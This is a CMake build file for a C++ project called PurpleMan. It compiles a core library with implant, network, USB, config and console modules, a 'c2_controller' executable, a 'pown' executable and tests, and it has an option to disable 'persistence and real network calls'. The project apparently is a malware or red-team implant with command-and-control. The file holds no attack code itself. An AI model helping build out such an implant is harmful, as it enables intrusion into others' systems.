cmake_minimum_required(VERSION 3.16)
project(PurpleMan LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Option to compile in testing mode (disables persistence and real network calls)
option(TESTING "Build with TESTING mode: disable persistence and real network" OFF)
if(TESTING)
    add_compile_definitions(TESTING)
endif()

if(MSVC)
    add_compile_options(/W4 /permissive-)
else()
    add_compile_options(-Wall -Wextra -Wpedantic)
endif()

include_directories(${PROJECT_SOURCE_DIR}/include)

add_library(purpleman_core STATIC
    src/implant/manager.cpp
    src/network/manager.cpp
    src/network/client.cpp
    src/usb/manager.cpp
    src/config/manager.cpp
    src/log/logger.cpp
    src/cli/console.cpp
    src/utils/helpers.cpp
)

target_include_directories(purpleman_core PUBLIC ${PROJECT_SOURCE_DIR}/include)
if (WIN32)
    target_link_libraries(purpleman_core PUBLIC ws2_32 winhttp)
endif()

add_executable(c2_controller
    c2_contoller.cpp
)

target_link_libraries(c2_controller PRIVATE purpleman_core)

add_executable(pown
    pown.cpp
)

target_link_libraries(pown PRIVATE purpleman_core)

enable_testing()
add_subdirectory(tests)
